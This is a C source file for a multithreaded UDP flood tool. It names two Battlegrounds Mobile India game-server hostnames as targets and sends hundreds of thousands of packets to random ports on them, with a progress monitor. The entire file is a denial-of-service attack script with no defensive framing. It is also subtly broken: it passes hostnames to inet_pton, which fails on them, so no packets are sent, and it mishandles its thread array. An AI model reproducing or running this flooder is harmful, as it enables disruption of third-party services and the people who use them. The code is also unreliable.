#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>

#define NUM_SERVERS 2
#define BUFFER_SIZE 32
#define MIN_PORT 10000
#define MAX_PORT 65535
#define TOTAL_PACKETS 600000    // 1200 threads * 500 packets
#define THREAD_POOL_SIZE 50     // Manageable number of concurrent threads
#define PACKETS_PER_THREAD 500

// Global server list
static const char *bgmi_servers[] = {
    "gateway.battlegroundsmobileindia.com",
    "matchmaker.bgmi.com"
};

// Global control and tracking
volatile int running = 1;
static volatile long total_packets_sent = 0;
pthread_mutex_t packet_counter_mutex = PTHREAD_MUTEX_INITIALIZER;

// Structure to hold thread parameters
typedef struct {
    int thread_id;
    int packets_to_send;
    int packets_sent;
} thread_params_t;

void *udp_flood(void *arg) {
    thread_params_t *params = (thread_params_t *)arg;
    int sock;
    struct sockaddr_in target;
    char buffer[BUFFER_SIZE] = "\x16\xfe\xfd\x00\x00\x00\x00\x01\x00\x00\x00\x00";
    socklen_t addr_len = sizeof(target);
    
    // Seed random number generator
    srand(time(NULL) ^ pthread_self());
    
    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        free(params);
        pthread_exit(NULL);
    }
    
    // Set socket to non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    // Initialize target
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    
    while (params->packets_sent < params->packets_to_send && running) {
        target.sin_port = htons(MIN_PORT + (rand() % (MAX_PORT - MIN_PORT + 1)));
        const char *target_server = bgmi_servers[rand() % NUM_SERVERS];
        
        if (inet_pton(AF_INET, target_server, &target.sin_addr) <= 0) {
            continue;
        }
        
        if (sendto(sock, buffer, BUFFER_SIZE, 0, 
                  (struct sockaddr *)&target, addr_len) > 0) {
            params->packets_sent++;
            
            // Update global counter
            pthread_mutex_lock(&packet_counter_mutex);
            total_packets_sent++;
            pthread_mutex_unlock(&packet_counter_mutex);
        }
        
        // Small delay to prevent overwhelming system
        usleep(100);
    }
    
    close(sock);
    free(params);
    pthread_exit(NULL);
}

void *progress_monitor(void *arg) {
    while (running) {
        sleep(2); // Update every 2 seconds
        pthread_mutex_lock(&packet_counter_mutex);
        printf("Progress: %ld/%d packets sent (%.2f%%)\n",
               total_packets_sent, TOTAL_PACKETS,
               (float)total_packets_sent / TOTAL_PACKETS * 100);
        if (total_packets_sent >= TOTAL_PACKETS) {
            running = 0;
        }
        pthread_mutex_unlock(&packet_counter_mutex);
    }
    pthread_exit(NULL);
}

int main() {
    pthread_t threads[THREAD_POOL_SIZE];
    pthread_t monitor_thread;
    int active_threads = 0;
    int total_threads_needed = TOTAL_PACKETS / PACKETS_PER_THREAD;
    
    printf("Starting UDP flood: %d total packets with %d threads (pool size: %d)\n",
           TOTAL_PACKETS, total_threads_needed, THREAD_POOL_SIZE);
    
    // Start progress monitor
    pthread_create(&monitor_thread, NULL, progress_monitor, NULL);
    
    // Main thread management loop
    for (int i = 0; i < total_threads_needed && running; i++) {
        // Wait for available slot in thread pool
        while (active_threads >= THREAD_POOL_SIZE && running) {
            sleep(1);
            // Clean up completed threads
            for (int j = 0; j < THREAD_POOL_SIZE; j++) {
                if (threads[j] && pthread_tryjoin_np(threads[j], NULL) == 0) {
                    threads[j] = 0;
                    active_threads--;
                }
            }
        }
        
        if (!running) break;
        
        // Create new thread
        thread_params_t *params = malloc(sizeof(thread_params_t));
        params->thread_id = i;
        params->packets_to_send = PACKETS_PER_THREAD;
        params->packets_sent = 0;
        
        if (pthread_create(&threads[active_threads], NULL, udp_flood, params) == 0) {
            active_threads++;
        } else {
            perror("Thread creation failed");
            free(params);
            running = 0;
        }
    }
    
    // Wait for all remaining threads
    for (int i = 0; i < THREAD_POOL_SIZE; i++) {
        if (threads[i]) {
            pthread_join(threads[i], NULL);
        }
    }
    
    running = 0;
    pthread_join(monitor_thread, NULL);
    
    printf("Operation completed. Total packets sent: %ld\n", total_packets_sent);
    pthread_mutex_destroy(&packet_counter_mutex);
    return 0;
}